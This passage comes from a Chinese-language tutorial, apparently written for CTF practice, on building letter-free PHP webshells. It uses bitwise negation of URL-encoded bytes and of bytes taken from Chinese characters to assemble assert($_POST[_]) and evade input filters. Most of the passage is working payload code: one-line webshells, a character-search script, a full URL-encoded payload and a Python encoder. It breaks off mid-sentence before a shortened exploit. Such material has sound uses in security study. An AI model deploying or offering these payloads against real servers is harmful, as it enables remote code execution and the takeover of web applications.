<p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>然后就可以RCE了</p>
<p><img src="https://s2.loli.net/2023/11/18/3JL4aIBtZ2ubSip.png" alt="image.png"></p>
<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;卢&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(~(<span class="variable">$_</span>&#123;<span class="number">1</span>&#125;));</span><br><span class="line"><span class="keyword">print</span>(~<span class="string">&quot;\x8d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出rr</span></span><br></pre></td></tr></table></figure>

<p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code></p>
<p>我们需要知道，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p>
<p>用脚本获得中文字（从3000+个汉字中获得通过取反得到assert）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>

<p>构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line">%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%<span class="number">9</span>E%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>C%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%<span class="number">9</span>A%AE%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>D%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>B%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%AF%B8%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%B0%<span class="number">8</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%AC%A0%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%AB%<span class="number">8</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B    </span><br></pre></td></tr></table></figure>

<p>升级版：</p>
<p>在上面的学习过程中，可以知道:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=&quot;卢&quot;;</span><br><span class="line">print(~($_&#123;1&#125;));</span><br><span class="line">print(~&quot;\x8d&quot;);</span><br></pre></td></tr></table></figure>

<p>这两种写法其实是等价的。所以如果把EXP中的<code>~(&quot;欠&quot;&#123;1&#125;)</code>写成<code>~&quot;\x8d&quot;</code>这种形式，可以缩减不少字符。给出脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">shell</span>):</span><br><span class="line">    hexbit=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(~(-(<span class="number">256</span>-<span class="built_in">ord</span>(x)))),shell))</span><br><span class="line">    hexbit = hexbit.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexbit)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;assert&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;_POST&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>利用这个POC，我把上面的EXP缩减为：</p>
